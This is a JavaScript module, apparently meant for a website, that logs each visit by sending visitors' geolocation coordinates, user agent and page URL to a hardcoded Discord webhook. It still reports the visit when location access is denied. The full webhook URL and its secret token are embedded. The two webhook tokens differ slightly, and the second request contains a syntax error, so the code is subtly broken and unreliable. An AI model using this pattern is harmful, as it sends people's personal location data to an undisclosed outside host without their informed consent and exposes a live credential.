const logUserVisit = () => {
  const userAgent = navigator.userAgent; // Browser Info

  // Prompt
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        };

        // Sending Function
        await fetch("https://discord.com/api/webhooks/1351917475603681333/w9ffUI0ZiQSrl4kvjVZSBMd8LyQqSkKib9P4qd9UdCKajCQZYUWXrKKsbNkLaD21nuKn", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "New user visit logged:",
            embeds: [
              {
                title: "Visit Details",
                fields: [
                  { name: "Timestamp", value: new Date().toISOString(), inline: true },
                  { name: "User Agent", value: userAgent, inline: false },
                  { name: "Page URL", value: window.location.href, inline: false },
                  {
                    name: "Location",
                    value: `Latitude: ${locationData.latitude}, Longitude: ${locationData.longitude}`
                  }
                ]
              }
            ]
          })
        });
      },
      async () => {
        // In Case user denies the location
        await fetch("https://discord.com/api/webhooks/1351917475603681333/w9ffUI0ZiQSrl4kvjVZSBMd8LyQqSkKib9UdCKajCQZYUWXrKKsbNkLaD21nuKn", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "New user visit logged:",
            embeds: [
              {
                title: "Visit Details",
                fields: [
                  { name: "Timestamp", value: new Date().toISOString(), inline: true },
                  { name: "User Agent", value: userAgent, inline: false },
                  { name: "Page URL", value: window.location.href, inline: false },
                  {
                    name: "Location",
                    value: "Location access denied"
                  }
                ]
              }
            ]
          });
        });
      }
    );
  } else {
    console.error("Geolocation not supported by this browser.");
  }
};

export default logUserVisit;
